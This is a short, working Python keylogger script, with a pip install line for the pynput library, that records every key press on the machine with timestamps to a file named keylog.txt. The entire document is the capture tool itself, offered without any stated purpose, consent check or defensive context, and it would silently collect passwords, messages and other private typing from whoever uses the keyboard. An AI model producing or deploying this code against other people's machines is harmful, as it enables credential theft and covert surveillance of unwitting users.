pip install pynput
from pynput.keyboard import Key, Listener
import logging

# Configure the logging subsystem to write to a specific file
log_dir = ""
logging.basicConfig(filename=(log_dir + "keylog.txt"), 
                    level=logging.DEBUG, 
                    format='%(asctime)s: %(message)s')

# Define the event handler for key press events
def on_press(key):
    try:
        logging.info(str(key))
    except Exception as e:
        print(f"Error logging key: {e}")

# Initialize and start the keyboard listener
with Listener(on_press=on_press) as listener:
    listener.join()
